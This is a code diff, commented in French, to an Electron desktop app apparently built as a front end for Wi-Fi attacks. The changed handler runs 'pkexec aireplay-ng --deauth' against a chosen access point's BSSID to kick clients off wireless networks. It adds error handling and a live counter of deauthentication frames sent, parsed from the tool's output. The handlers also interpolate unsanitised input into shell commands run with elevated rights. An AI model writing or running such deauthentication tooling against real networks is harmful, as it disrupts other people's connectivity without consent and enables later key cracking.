@@ -26,6 +26,7 @@ let boundsvalue = {}
 let actualyview = 'mainwiew';
 let mainWindow
 let mainwiew
+let deauthCounter = 0; // Compteur de requêtes de déauth
 
 // Création de la fenêtre
 const createWindow = () => {
@@ -254,10 +255,66 @@ ipcMain.on('deauthattack', (event,channel,bssid,deauth) => {
   const { exec } = require('child_process');
   const channelCommand = `pkexec iwconfig ${config.networkcard} channel ${channel}`;
   const attackCommand = `pkexec aireplay-ng --deauth ${deauth} -a ${bssid} ${config.networkcard}`;
-  execSync(channelCommand);
-  log(`channel : ${channel}`)
-  exec(attackCommand)
-  log(attackCommand)
+  
+  try {
+    execSync(channelCommand);
+    log(`Channel configuré avec succès: ${channel}`);
+  } catch (error) {
+    log(`Erreur lors de la configuration du channel: ${error.message}`);
+    event.reply('deauth-error', 'Erreur de configuration du channel');
+    return;
+  }
+  
+  // Réinitialiser le compteur au début de chaque nouvelle attaque
+  deauthCounter = 0;
+  event.reply('deauth-counter-update', deauthCounter);
+  
+  // Créer un processus pour exécuter la commande d'attaque
+  const attackProcess = exec(attackCommand);
+  
+  let buffer = '';
+  let errorBuffer = '';
+  
+  // Compter les requêtes de déauth avec une meilleure détection
+  attackProcess.stdout.on('data', (data) => {
+    buffer += data;
+    log(`Sortie aireplay-ng: ${data}`);
+    
+    // Traiter le buffer ligne par ligne
+    const lines = buffer.split('\n');
+    buffer = lines.pop(); // Garder la dernière ligne incomplète dans le buffer
+    
+    for (const line of lines) {
+      if (line.includes('Sending DeAuth (code 7)')) {
+        deauthCounter++;
+        event.reply('deauth-counter-update', deauthCounter);
+        log(`Requête de déauth #${deauthCounter} envoyée`);
+      }
+    }
+  });
+
+  // Gérer la fin du processus
+  attackProcess.on('close', (code) => {
+    if (code === 0) {
+      log(`Processus d'attaque terminé avec succès`);
+    } else {
+      log(`Processus d'attaque terminé avec erreur (code: ${code})`);
+      log(`Buffer d'erreur complet: ${errorBuffer}`);
+    }
+  });
+
+  // Gérer les erreurs du processus
+  attackProcess.on('error', (error) => {
+    log(`Erreur lors de l'exécution d'aireplay-ng: ${error.message}`);
+  });
+  
+  log(`Commande d'attaque lancée: ${attackCommand}`);
+});
+
+// Ajouter un événement pour réinitialiser le compteur
+ipcMain.on('reset-deauth-counter', (event) => {
+  deauthCounter = 0;
+  event.reply('deauth-counter-update', deauthCounter);
 });
 
 ipcMain.on('aircrackattack', (event, command) => {
